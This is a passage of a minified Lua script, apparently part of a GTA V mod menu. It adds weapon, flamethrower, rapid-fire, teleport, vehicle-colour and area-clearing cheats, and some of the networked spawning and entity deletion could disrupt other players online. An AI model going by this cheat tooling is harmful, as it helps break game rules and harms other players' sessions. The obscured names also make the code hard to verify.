                        weapon.give_delayed_weapon_to_ped(aX(), P[B][1], 0, 0)
                    end
                end
                for B = 1, #P do
                    for cU = 2, #P[B] do
                        if not weapon.has_ped_got_weapon_component(aX(), P[B][1], P[B][cU]) then
                            for d2 = 2, #P[B] do
                                weapon.give_weapon_component_to_ped(aX(), P[B][1], P[B][d2])
                            end
                            weapon.set_ped_ammo(aX(), P[B][1], 9999)
                        end
                    end
                end
            end
            c["load_weapons"] = aP.on
            return aO(aP)
        end
    )
    S["load_weapons"].on = c["load_weapons"]
    R["flamethrower"] = aD("Flamethrower", R["weapon"]).id
    S["flamethrower_scale"] =
        aI(
        "Scale",
        "autoaction_value_i",
        R["flamethrower"],
        function()
            c["flamethrower_scale"] = S["flamethrower_scale"].value_i
        end
    )
    S["flamethrower_scale"].min_i = 1
    S["flamethrower_scale"].max_i = 25
    S["flamethrower_scale"].value_i = c["flamethrower_scale"]
    S["flamethrower"] =
        aH(
        "Flamethrower",
        R["flamethrower"],
        function(aP)
            if aP.on then
                if player.is_player_free_aiming(aV()) then
                    graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                    while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                        graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                        system.wait(0)
                    end
                    if au["alien"] == nil then
                        aS(1803116220)
                        au["alien"] = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(au["alien"], false, false, false)
                        entity.set_entity_visible(au["alien"], false)
                        aT(1803116220)
                    end
                    local dK, dL = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    while not dK do
                        system.wait(0)
                        dK, dL = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    end
                    b0(au["alien"], dL)
                    entity.set_entity_rotation(au["alien"], cam.get_gameplay_cam_rot())
                    if au["flamethrower"] == nil then
                        au["flamethrower"] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping",
                            au["alien"],
                            v3(),
                            v3(),
                            c["flamethrower_scale"]
                        )
                        graphics.set_particle_fx_looped_scale(au["flamethrower"], c["flamethrower_scale"])
                    end
                else
                    if au["flamethrower"] ~= nil then
                        graphics.remove_particle_fx(au["flamethrower"], true)
                        au["flamethrower"] = nil
                        b1({au["alien"]})
                        au["alien"] = nil
                    end
                end
            end
            if not aP.on then
                if au["flamethrower"] ~= nil then
                    graphics.remove_particle_fx(au["flamethrower"], true)
                    au["flamethrower"] = nil
                    b1({au["alien"]})
                    au["alien"] = nil
                end
            end
            c["flamethrower"] = aP.on
            return aO(aP)
        end
    )
    S["flamethrower"].on = c["flamethrower"]
    S["flamethrower_green"] =
        aH(
        "Flamethrower - Green",
        R["flamethrower"],
        function(aP)
            if aP.on then
                if player.is_player_free_aiming(aV()) then
                    graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                    while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                        graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                        system.wait(0)
                    end
                    if au["alien"] == nil then
                        aS(1803116220)
                        au["alien"] = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(au["alien"], false, false, false)
                        entity.set_entity_visible(au["alien"], false)
                        aT(1803116220)
                    end
                    local dK, dL = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    while not dK do
                        system.wait(0)
                        dK, dL = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    end
                    b0(au["alien"], dL)
                    entity.set_entity_rotation(au["alien"], cam.get_gameplay_cam_rot())
                    if au["flamethrower_green"] == nil then
                        au["flamethrower_green"] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping_sf",
                            au["alien"],
                            v3(),
                            v3(),
                            c["flamethrower_scale"]
                        )
                    end
                else
                    if au["flamethrower_green"] ~= nil then
                        graphics.remove_particle_fx(au["flamethrower_green"], true)
                        au["flamethrower_green"] = nil
                        b1({au["alien"]})
                        au["alien"] = nil
                    end
                end
            end
            if not aP.on then
                if au["flamethrower_green"] ~= nil then
                    graphics.remove_particle_fx(au["flamethrower_green"], true)
                    au["flamethrower_green"] = nil
                    b1({au["alien"]})
                    au["alien"] = nil
                end
            end
            c["flamethrower_green"] = aP.on
            return aO(aP)
        end
    )
    S["flamethrower_green"].on = c["flamethrower_green"]
    R["shoot"] = aD("Shoot Objects", R["weapon"]).id
    S["shoot"] =
        aH(
        "Enable Object Shoot",
        R["shoot"],
        function(aP)
            if aP.on then
                for B = 1, #p do
                    if c[p[B][1]] and ped.is_ped_shooting(aX()) then
                        if #Q["shooting"] > 128 then
                            b1(Q["shooting"])
                            Q["shooting"] = {}
                        end
                        aS(p[B][2])
                        local bb = a_()
                        local dG = cam.get_gameplay_cam_rot()
                        dG:transformRotToDir()
                        dG = dG * 8
                        bb = bb + dG
                        if streaming.is_model_an_object(p[B][2]) then
                            Q["shooting"][#Q["shooting"] + 1] = object.create_object(p[B][2], bb, true, false)
                        end
                        dG = nil
                        local dM = a_()
                        dG = cam.get_gameplay_cam_rot()
                        dG:transformRotToDir()
                        dG = dG * 100
                        dM = dM + dG
                        local dt = dM - bb
                        entity.apply_force_to_entity(
                            Q["shooting"][#Q["shooting"]],
                            3,
                            dt.x,
                            dt.y,
                            dt.z,
                            0.0,
                            0.0,
                            0.0,
                            true,
                            true
                        )
                    end
                end
            end
            if not aP.on then
                b1(Q["shooting"])
                Q["shooting"] = {}
            end
            c["shoot_entitys"] = aP.on
            return aO(aP)
        end
    )
    S["shoot"].on = c["shoot_entitys"]
    aG(
        "Delete Objects",
        R["shoot"],
        function()
            b1(Q["shooting"])
            Q["shooting"] = {}
        end
    )
    for B = 1, #p do
        S[p[B][1]] =
            aH(
            "Shoot " .. p[B][1],
            R["shoot"],
            function(aP)
                p[B][3] = aP.on
                c[p[B][1]] = aP.on
            end
        )
        S[p[B][1]].on = c[p[B][1]]
    end
    S["delete_gun"] =
        aH(
        "Delete Gun",
        R["weapon"],
        function(aP)
            if aP.on then
                if ped.is_ped_shooting(aX()) then
                    local dN = player.get_entity_player_is_aiming_at(aV())
                    if dN ~= nil then
                        b1({dN})
                    end
                end
            end
            c["delete_gun"] = aP.on
            return aO(aP)
        end
    )
    S["delete_gun"].on = c["delete_gun"]
    R["model_gun"] = aD("Model Gun", R["weapon"]).id
    S["model_gun"] =
        aH(
        "Standard Model Gun (PEDs)",
        R["model_gun"],
        function(aP)
            if aP.on then
                if aq then
                    entity.set_entity_visible(aX(), false)
                    if ap ~= nil then
                        entity.set_entity_visible(ap, true)
                    end
                else
                    entity.set_entity_visible(aX(), true)
                end
                if player.is_player_free_aiming(aV()) then
                    local dO = player.get_entity_player_is_aiming_at(aV())
                    if dO ~= 0 then
                        dO = entity.get_entity_model_hash(dO)
                        if streaming.is_model_a_ped(dO) then
                            if ap ~= nil then
                                b1({ap})
                                ap = nil
                            end
                            local dP = entity.get_entity_model_hash(aX())
                            if dO ~= dP then
                                aq = false
                                system.wait(50)
                                local dQ = ped.get_current_ped_weapon(aX())
                                bl(dO, nil, nil, nil, true)
                                system.yield(25)
                                weapon.give_delayed_weapon_to_ped(aX(), dQ, 0, 1)
                            end
                        elseif streaming.is_model_a_vehicle(dO) and S["model_gun_ext"].on then
                            b1({ap})
                            ap = nil
                            aq = true
                            ap = vehicle.create_vehicle(dO, a_(), 0, true, false)
                            entity.attach_entity_to_entity(ap, aX(), 0, v3(), v3(), true, true, false, 0, true)
                        elseif streaming.is_model_an_object(dO) and S["model_gun_ext"].on then
                            b1({ap})
                            ap = nil
                            aS(dO)
                            ap = object.create_object(dO, a_(), true, false)
                            aT(dO)
                            aq = true
                            entity.attach_entity_to_entity(ap, aX(), 0, v3(), v3(), true, true, false, 0, true)
                        end
                    end
                end
            end
            if not aP.on then
                b1({ap})
                ap = nil
                entity.set_entity_visible(aX(), true)
            end
            c["model_gun"] = aP.on
            return aO(aP)
        end
    )
    S["model_gun"].on = c["model_gun"]
    S["model_gun_ext"] =
        aH(
        "Add Objects and Vehicles to Model Gun",
        R["model_gun"],
        function(aP)
            c["model_gun_ext"] = aP.on
        end
    )
    S["model_gun_ext"].on = c["model_gun_ext"]
    S["rapid_fire"] =
        aH(
        "Rapid Fire",
        R["weapon"],
        function(aP)
            if aP.on then
                if player.is_player_free_aiming(aV()) then
                    if ped.is_ped_shooting(aX()) then
                        for B = 1, 20 do
                            local dR = a_()
                            local dG = cam.get_gameplay_cam_rot()
                            dG:transformRotToDir()
                            dG = dG * 1.5
                            dR = dR + dG
                            dG = nil
                            local dS = a_()
                            dG = cam.get_gameplay_cam_rot()
                            dG:transformRotToDir()
                            dG = dG * 2500
                            dS = dS + dG
                            local dT = ped.get_current_ped_weapon(aX())
                            if menu.get_version() ~= "2.4.2" then
                                gameplay.shoot_single_bullet_between_coords(dR, dS, 1, dT, aX(), true, false, 1000)
                            end
                            system.wait(25)
                        end
                    end
                end
            end
            c["rapid_fire"] = aP.on
            return aO(aP)
        end
    )
    S["rapid_fire"].on = c["rapid_fire"]
    S["teleport_high_in_air"] =
        aG(
        "Teleport High in Air",
        R["misc"],
        function()
            local bb = a_()
            while bb.z < 25000 do
                bb.z = bb.z + 500
                b8(bb)
                system.yield(50)
            end
        end
    )
    R["vehicle"] = aD("Vehicle", R["misc"]).id
    S["tp_own_veh_to_me"] =
        aG(
        "Teleport Own Vehicle to me",
        R["vehicle"],
        function()
            local bc = player.get_personal_vehicle()
            local dU = ped.get_vehicle_ped_is_using(aX())
            if bc ~= 0 and dU ~= bc then
                b0(bc, bO(a_(), aY(), 5))
                entity.set_entity_heading(bc, aY())
            end
        end
    )
    S["tp_own_veh_to_me_drive"] =
        aG(
        "Teleport Own Vehicle to me and drive",
        R["vehicle"],
        function()
            local bc = player.get_personal_vehicle()
            local dU = ped.get_vehicle_ped_is_using(aX())
            if bc ~= 0 and dU ~= bc then
                b0(bc, a_())
                entity.set_entity_heading(bc, aY())
                ped.set_ped_into_vehicle(aX(), bc, -1)
            end
        end
    )
    S["drive_own_veh"] =
        aG(
        "Drive Own Vehicle",
        R["vehicle"],
        function()
            local bc = player.get_personal_vehicle()
            local dU = ped.get_vehicle_ped_is_using(aX())
            if bc ~= 0 and dU ~= bc then
                ped.set_ped_into_vehicle(aX(), bc, -1)
            end
        end
    )
    S["tp_to_own_veh"] =
        aG(
        "Teleport to Own Vehicle",
        R["vehicle"],
        function()
            local bc = player.get_personal_vehicle()
            local dU = ped.get_vehicle_ped_is_using(aX())
            if bc ~= 0 and dU ~= bc then
                b8(bO(aZ(bc), entity.get_entity_heading(bc), -5), 0, entity.get_entity_heading(bc))
            end
        end
    )
    R["vehicle_colors"] = aD("Vehicle Colors", R["vehicle"]).id
    S["light_speed"] =
        aI(
        "Set Speed in Milliseconds",
        "autoaction_value_i",
        R["vehicle_colors"],
        function(aP)
            c["veh_lights_speed"] = aP.value_i
        end
    )
    S["light_speed"].min_i = 25
    S["light_speed"].max_i = 2500
    S["light_speed"].mod_i = 25
    S["light_speed"].value_i = c["veh_lights_speed"]
    R["random_col"] = aD("Random Colors", R["vehicle_colors"]).id
    S["random_primary"] =
        aH(
        "Random Primary",
        R["random_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"rainbow_primary"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    vehicle.set_vehicle_custom_primary_colour(bc, math.random(0, 0xffffff))
                    system.wait(S["light_speed"].value_i)
                end
            end
            c["random_primary"] = aP.on
            return aO(aP)
        end
    )
    S["random_primary"].on = c["random_primary"]
    S["random_secondary"] =
        aH(
        "Random Secondary",
        R["random_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"rainbow_secondary"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    vehicle.set_vehicle_custom_secondary_colour(bc, math.random(0, 0xffffff))
                    system.wait(S["light_speed"].value_i)
                end
            end
            c["random_secondary"] = aP.on
            return aO(aP)
        end
    )
    S["random_secondary"].on = c["random_secondary"]
    S["random_pearlescent"] =
        aH(
        "Random Pearlescent",
        R["random_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"rainbow_pearlescent"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    vehicle.set_vehicle_custom_pearlescent_colour(bc, math.random(0, 0xffffff))
                    system.wait(S["light_speed"].value_i)
                end
            end
            c["random_pearlescent"] = aP.on
            return aO(aP)
        end
    )
    S["random_pearlescent"].on = c["random_pearlescent"]
    S["random_neon"] =
        aH(
        "Random Neon Lights",
        R["random_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"rainbow_neon"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    local dl = math.random(0, 0xffffff)
                    vehicle.set_vehicle_neon_lights_color(bc, dl)
                    system.wait(S["light_speed"].value_i)
                end
            end
            c["random_neon"] = aP.on
            return aO(aP)
        end
    )
    S["random_neon"].on = c["random_neon"]
    S["random_smoke"] =
        aH(
        "Random Smoke",
        R["random_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"rainbow_smoke"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    local dV = math.random(0, 255)
                    local dW = math.random(0, 255)
                    local dX = math.random(0, 255)
                    vehicle.set_vehicle_tire_smoke_color(bc, dV, dW, dX)
                    system.wait(S["light_speed"].value_i)
                end
            end
            c["random_smoke"] = aP.on
            return aO(aP)
        end
    )
    S["random_smoke"].on = c["random_smoke"]
    S["random_xenon"] =
        aH(
        "Random Xenon",
        R["random_col"],
        function(aP)
            if aP.on then
                if menu.get_version() ~= "2.4.2" then
                    b_(_)
                    b_({"rainbow_xenon"})
                    local bc = ped.get_vehicle_ped_is_using(aX())
                    if bc ~= 0 then
                        aQ(bc)
                        vehicle.set_vehicle_headlight_color(bc, math.random(0, 12))
                        system.wait(S["light_speed"].value_i)
                    end
                end
            end
            c["random_xenon"] = aP.on
            return aO(aP)
        end
    )
    S["random_xenon"].on = c["random_xenon"]
    R["rainbow_col"] = aD("Rainbow Colors", R["vehicle_colors"]).id
    S["rainbow_primary"] =
        aH(
        "Rainbow Primary",
        R["rainbow_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"random_primary"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    for B = 1, #q do
                        vehicle.set_vehicle_custom_primary_colour(bc, bR({q[B][1], q[B][2], q[B][3]}))
                        system.wait(S["light_speed"].value_i)
                    end
                end
            end
            c["rainbow_primary"] = aP.on
            return aO(aP)
        end
    )
    S["rainbow_primary"].on = c["rainbow_primary"]
    S["rainbow_secondary"] =
        aH(
        "Rainbow Secondary",
        R["rainbow_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"random_secondary"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    for B = 1, #q do
                        vehicle.set_vehicle_custom_secondary_colour(bc, bR({q[B][1], q[B][2], q[B][3]}))
                        system.wait(S["light_speed"].value_i)
                    end
                end
            end
            c["rainbow_secondary"] = aP.on
            return aO(aP)
        end
    )
    S["rainbow_secondary"].on = c["rainbow_secondary"]
    S["rainbow_pearlescent"] =
        aH(
        "Rainbow Pearlescent",
        R["rainbow_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"random_pearlescent"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    for B = 1, #q do
                        vehicle.set_vehicle_custom_pearlescent_colour(bc, bR({q[B][1], q[B][2], q[B][3]}))
                        system.wait(S["light_speed"].value_i)
                    end
                end
            end
            c["rainbow_pearlescent"] = aP.on
            return aO(aP)
        end
    )
    S["rainbow_pearlescent"].on = c["rainbow_pearlescent"]
    S["rainbow_neon"] =
        aH(
        "Rainbow Neon Lights",
        R["rainbow_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"random_neon"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    for B = 1, #q do
                        vehicle.set_vehicle_neon_lights_color(bc, bR({q[B][1], q[B][2], q[B][3]}))
                        system.wait(S["light_speed"].value_i)
                    end
                end
            end
            c["rainbow_neon"] = aP.on
            return aO(aP)
        end
    )
    S["rainbow_neon"].on = c["rainbow_neon"]
    S["rainbow_smoke"] =
        aH(
        "Rainbow Smoke",
        R["rainbow_col"],
        function(aP)
            if aP.on then
                b_(_)
                b_({"random_smoke"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    aQ(bc)
                    for B = 1, #q do
                        local h = q[B]
                        vehicle.set_vehicle_tire_smoke_color(bc, h[1], h[2], h[3])
                        system.wait(S["light_speed"].value_i)
                    end
                end
            end
            c["rainbow_smoke"] = aP.on
            return aO(aP)
        end
    )
    S["rainbow_smoke"].on = c["rainbow_smoke"]
    S["rainbow_xenon"] =
        aH(
        "Rainbow Xenon",
        R["rainbow_col"],
        function(aP)
            if aP.on then
                if menu.get_version() ~= "2.4.2" then
                    b_(_)
                    b_({"random_xenon"})
                    local bc = ped.get_vehicle_ped_is_using(aX())
                    if bc ~= 0 then
                        aQ(bc)
                        for B = 0, 12 do
                            vehicle.set_vehicle_headlight_color(bc, B)
                            system.wait(S["light_speed"].value_i)
                        end
                    end
                end
            end
            c["rainbow_xenon"] = aP.on
            return aO(aP)
        end
    )
    S["rainbow_xenon"].on = c["rainbow_xenon"]
    S["synced_random"] =
        aH(
        "Synced Random Colors",
        R["vehicle_colors"],
        function(aP)
            if aP.on then
                b_(Z)
                b_(Y)
                b_({"synced_rainbow_smooth", "synced_rainbow"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    c1(bc, {math.random(0, 255), math.random(0, 255), math.random(0, 255)})
                    system.wait(S["light_speed"].value_i)
                end
            end
            c["synced_random"] = aP.on
            return aO(aP)
        end
    )
    S["synced_random"].on = c["synced_random"]
    S["synced_rainbow"] =
        aH(
        "Synced Rainbow Colors",
        R["vehicle_colors"],
        function(aP)
            if aP.on then
                b_(Z)
                b_(Y)
                b_({"synced_random", "synced_rainbow_smooth"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    for B = 1, #q do
                        local h = q[B]
                        c1(bc, {h[1], h[2], h[3]}, B)
                        system.wait(S["light_speed"].value_i)
                    end
                end
            end
            c["synced_rainbow"] = aP.on
            return aO(aP)
        end
    )
    S["synced_rainbow"].on = c["synced_rainbow"]
    S["synced_rainbow_smooth"] =
        aH(
        "Synced Smooth Rainbow",
        R["vehicle_colors"],
        function(aP)
            if aP.on then
                b_(Z)
                b_(Y)
                b_({"synced_random", "synced_rainbow"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    local dY
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 0, 255, dY do
                        c1(bc, {255, B, 0})
                    end
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 255, 0, -dY do
                        c1(bc, {B, 255, 0})
                    end
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 0, 255, dY do
                        c1(bc, {0, 255, B})
                    end
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 255, 0, -dY do
                        c1(bc, {0, B, 255})
                    end
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 0, 255, dY do
                        c1(bc, {B, 0, 255})
                    end
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 255, 0, -dY do
                        c1(bc, {255, 0, B})
                    end
                end
            end
            c["synced_rainbow_smooth"] = aP.on
            return aO(aP)
        end
    )
    S["synced_rainbow_smooth"].on = c["synced_rainbow_smooth"]
    aG(
        "100% Black",
        R["vehicle_colors"],
        function()
            local bc = ped.get_vehicle_ped_is_using(aX())
            if bc ~= 0 then
                c1(bc, {0, 0, 0}, 0)
            else
                f("Get in a valid Vehicle!", 173)
            end
        end
    )
    S["black_100"] =
        aH(
        "100% Black",
        R["vehicle_colors"],
        function(aP)
            if aP.on then
                b_(Z)
                b_(Y)
                b_(_)
                b_({"fade_black_red"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    c1(bc, {0, 0, 0}, 0)
                end
            end
            c["black_100"] = aP.on
            return aO(aP)
        end
    )
    S["black_100"].on = c["black_100"]
    S["fade_black_red"] =
        aH(
        "Fade Black-Red",
        R["vehicle_colors"],
        function(aP)
            if aP.on then
                b_(Z)
                b_(Y)
                b_(_)
                b_({"black_100"})
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    local dY
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 0, 255, dY do
                        c1(bc, {B, 0, 0}, 0, 8)
                    end
                    dY = math.floor((101 - S["light_speed"].value_i / 25) / 2)
                    if dY < 1 then
                        dY = 1
                    end
                    for B = 255, 0, -dY do
                        c1(bc, {B, 0, 0}, 0, 8)
                    end
                end
            end
            c["fade_black_red"] = aP.on
            return aO(aP)
        end
    )
    S["fade_black_red"].on = c["fade_black_red"]
    S["heli"] =
        aI(
        "Heli Blades Speed 0-100%",
        "value_i",
        R["vehicle"],
        function(aP)
            c["heli"] = aP.on
            c["heli_i"] = S["heli"].value_i
            local bc = ped.get_vehicle_ped_is_using(aX())
            if aP.on then
                if bc ~= 0 then
                    aQ(bc)
                    local cX = aP.value_i / 100
                    if menu.get_version() ~= "2.4.2" then
                        vehicle.set_heli_blades_speed(bc, cX)
                    end
                end
            end
            return aO(aP)
        end
    )
    S["heli"].max_i = 100
    S["heli"].min_i = 0
    S["heli"].mod_i = 5
    S["heli"].value_i = c["heli_i"]
    S["heli"].on = c["heli"]
    S["sel_boost_speed"] =
        aI(
        "Boost Vehicle",
        "value_i",
        R["vehicle"],
        function(aP)
            c["sel_boost_speed"] = aP.on
            c["sel_boost_speed_speed"] = S["sel_boost_speed"].value_i
            local bc = ped.get_vehicle_ped_is_using(aX())
            if aP.on then
                if bc ~= 0 then
                    aQ(bc)
                    entity.set_entity_max_speed(bc, S["sel_boost_speed"].value_i)
                    vehicle.set_vehicle_forward_speed(bc, S["sel_boost_speed"].value_i)
                end
            end
            if not aP.on then
                entity.set_entity_max_speed(bc, 540)
            end
            return aO(aP)
        end
    )
    S["sel_boost_speed"].max_i = 50000
    S["sel_boost_speed"].min_i = 0
    S["sel_boost_speed"].mod_i = 50
    S["sel_boost_speed"].value_i = c["sel_boost_speed_speed"]
    S["sel_boost_speed"].on = c["sel_boost_speed"]
    S["speedometer"] =
        aI(
        "License Plate Speedometer",
        "value_i",
        R["vehicle"],
        function(aP)
            c["speedometer"] = aP.on
            c["speedometer_type"] = S["speedometer"].value_i
            ac = S["speedometer"].value_i
            if aP.on then
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    if ac ~= ad then
                        f("Displaying Speed now with Unit:\n" .. K[S["speedometer"].value_i][3], 96)
                    end
                    local dZ = entity.get_entity_speed(bc) * K[S["speedometer"].value_i][2]
                    if dZ < 10 and dZ > 0.01 then
                        dZ = string.format("%.2f", dZ)
                    elseif dZ >= 10 and dZ < 100 then
                        dZ = string.format("%.1f", dZ)
                    elseif dZ < 0.01 and S["speedometer"].value_i == 7 then
                        dZ = string.format("%.5f", dZ)
                    else
                        dZ = math.floor(dZ)
                    end
                    vehicle.set_vehicle_number_plate_text(bc, tostring(dZ) .. K[S["speedometer"].value_i][1])
                end
            end
            ad = S["speedometer"].value_i
            return aO(aP)
        end
    )
    S["speedometer"].max_i = #K
    S["speedometer"].min_i = 1
    S["speedometer"].value_i = c["speedometer_type"]
    S["speedometer"].on = c["speedometer"]
    S["veh_no_colision"] =
        aH(
        "No collision",
        R["vehicle"],
        function(aP)
            if aP.on then
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    local d_ = ped.get_all_peds()
                    for B = 1, #d_ do
                        entity.set_entity_no_collsion_entity(d_[B], bc, true)
                        entity.set_entity_no_collsion_entity(bc, d_[B], true)
                    end
                    d_ = object.get_all_objects()
                    for B = 1, #d_ do
                        entity.set_entity_no_collsion_entity(d_[B], bc, true)
                        entity.set_entity_no_collsion_entity(bc, d_[B], true)
                    end
                    d_ = vehicle.get_all_vehicles()
                    for B = 1, #d_ do
                        entity.set_entity_no_collsion_entity(d_[B], bc, true)
                        entity.set_entity_no_collsion_entity(bc, d_[B], true)
                    end
                end
            end
            c["veh_no_colision"] = aP.on
            return aO(aP)
        end
    )
    S["veh_no_colision"].on = c["veh_no_colision"]
    S["drive_on_ocean"] =
        aH(
        "Drive / Walk on the Ocean",
        R["misc"],
        function(aP)
            if aP.on then
                local bb = a_()
                if ak == nil then
                    aS(1822550295)
                    ak = object.create_object(1822550295, v3(bb.x, bb.y, -4), true, false)
                    entity.set_entity_visible(ak, false)
                end
                water.set_waves_intensity(-100000000)
                bb.z = -4
                b0(ak, bb)
            end
            c["drive_on_ocean"] = aP.on
            if not aP.on and ak ~= nil then
                water.reset_waves_intensity()
                b1({ak})
                ak = nil
            end
            return aO(aP)
        end
    )
    S["drive_on_ocean"].on = c["drive_on_ocean"]
    S["drive_this_height"] =
        aH(
        "Drive / Walk this Height",
        R["misc"],
        function(aP)
            if aP.on then
                local bb, c9
                if ped.is_ped_in_any_vehicle(aX()) then
                    local bc = ped.get_vehicle_ped_is_using(aX())
                    bb = aZ(bc)
                    c9 = 5.25
                else
                    bb = a_()
                    c9 = 5.85
                end
                if al == nil then
                    aS(1822550295)
                    am = bb.z - c9
                    al = object.create_object(1822550295, v3(bb.x, bb.y, am), true, false)
                    entity.set_entity_visible(al, false)
                end
                water.set_waves_intensity(-100000000)
                bb.z = am
                b0(al, bb)
            end
            c["drive_this_height"] = aP.on
            if not aP.on and al ~= nil then
                water.reset_waves_intensity()
                b1({al})
                al = nil
                am = nil
            end
            return aO(aP)
        end
    )
    S["drive_this_height"].on = c["drive_this_height"]
    S["weird_ent"] =
        aH(
        "Weird Entity",
        R["misc"],
        function(aP)
            local bc = ped.get_vehicle_ped_is_using(aX())
            local e0 = aX()
            if aP.on then
                if bc ~= 0 and an == nil then
                    local ca = entity.get_entity_model_hash(bc)
                    an = vehicle.create_vehicle(ca, a_(), 0, true, false)
                    e0 = bc
                elseif an == nil then
                    an = ped.clone_ped(aX())
                end
                entity.set_entity_visible(e0, false)
                entity.set_entity_collision(an, false, false, false)
                entity.set_entity_rotation(
                    an,
                    v3(math.random(-180, 180), math.random(-180, 180), math.random(-180, 180))
                )
                b0(an, a_())
            end
            if not aP.on then
                b1({an})
                an = nil
                entity.set_entity_visible(e0, true)
            end
            c["weird_ent"] = aP.on
            return aO(aP)
        end
    )
    S["weird_ent"].on = c["weird_ent"]
    S["real_time"] =
        aH(
        "Real Time (Clientside)",
        R["misc"],
        function(aP)
            if aP.on then
                local g = os.date("*t")
                time.set_clock_time(g.hour, g.min, g.sec)
                gameplay.clear_cloud_hat()
            end
            c["real_time"] = aP.on
            return aO(aP)
        end
    )
    S["real_time"].on = c["real_time"]
    S["random_clothes"] =
        aH(
        "Random Clothes",
        R["misc"],
        function(aP)
            if aP.on then
                system.yield(333)
                ped.set_ped_random_component_variation(aX())
            end
            c["random_clothes"] = aP.on
            return aO(aP)
        end
    )
    S["random_clothes"].on = c["random_clothes"]
    S["clear_area"] =
        aH(
        "Gameplay Clear Area",
        R["misc"],
        function(aP)
            if aP.on then
                local bb = a_()
                gameplay.clear_area_of_cops(bb, 10000, true)
                gameplay.clear_area_of_peds(bb, 10000, true)
                gameplay.clear_area_of_vehicles(bb, 10000, false, false, false, false, false)
                gameplay.clear_area_of_objects(bb, 10000, 0)
                gameplay.clear_area_of_objects(bb, 10000, 1)
                gameplay.clear_area_of_objects(bb, 10000, 2)
                gameplay.clear_area_of_objects(bb, 10000, 6)
                gameplay.clear_area_of_objects(bb, 10000, 16)
                gameplay.clear_area_of_objects(bb, 10000, 17)
            end
            c["clear_area"] = aP.on
            return aO(aP)
        end
    )
    S["clear_area"].on = c["clear_area"]
    S["clear_area_2"] =
        aH(
        "Clear Area",
        R["misc"],
        function(aP)
            if aP.on then
                local e1 = ped.get_all_peds()
                for B = 1, #e1 do
                    local e2 = e1[B]
                    if not ped.is_ped_a_player(e2) and aP.on then
                        aQ(e2, 250)
                        entity.set_entity_velocity(e2, v3())
                        b0(e2, v3(8000, 8000, -1000))
                        entity.delete_entity(e2)
                    end
                end
                e1 = object.get_all_objects()
                for B = 1, #e1 do
                    local e2 = e1[B]
                    if aP.on then
                        aQ(e2, 250)
                        entity.set_entity_velocity(e2, v3())
                        b0(e2, v3(8000, 8000, -1000))
                        entity.delete_entity(e2)
                        system.wait(0)
                    end
                end
                e1 = vehicle.get_all_vehicles()
                local e3 = {}
                for cH = 0, 31 do
                    if aB(cH) ~= -1 then
                        local bc = ped.get_vehicle_ped_is_using(aW(cH))
                        if bc ~= 0 then
                            e3[#e3 + 1] = bc
                        end
                    end
                end
                for B = 1, #e1 do
                    local e2 = e1[B]
                    if aP.on then
                        local dN = true
                        for cM = 1, #e3 do
                            if e2 == e3[cM] then
                                dN = false
                            end
                        end
                        if dN then
                            aQ(e2, 250)
